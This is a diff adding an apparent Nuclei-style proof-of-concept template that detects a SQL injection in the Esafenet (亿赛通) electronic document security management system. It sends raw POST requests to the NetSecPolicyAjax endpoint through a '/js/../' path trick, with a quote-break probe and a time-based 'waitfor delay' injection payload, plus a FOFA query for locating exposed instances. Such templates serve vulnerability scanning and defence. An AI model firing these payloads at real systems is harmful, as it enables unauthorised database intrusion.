@@ -1,0 +1,59 @@
+id: poc-yaml-yisaitong-esafenet-netsecpolicyajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 NetSecPolicyAjax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 亿赛通电子文档安全管理系统
+    fofa: app="亿赛通-电子文档安全管理系统"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../NetSecPolicyAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=upPriority&id='
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - ""
+
+  - raw:
+      - |
+        POST /CDGServer3/js/../NetSecPolicyAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=upPriority&id=-1'waitfor delay '0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "OK"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
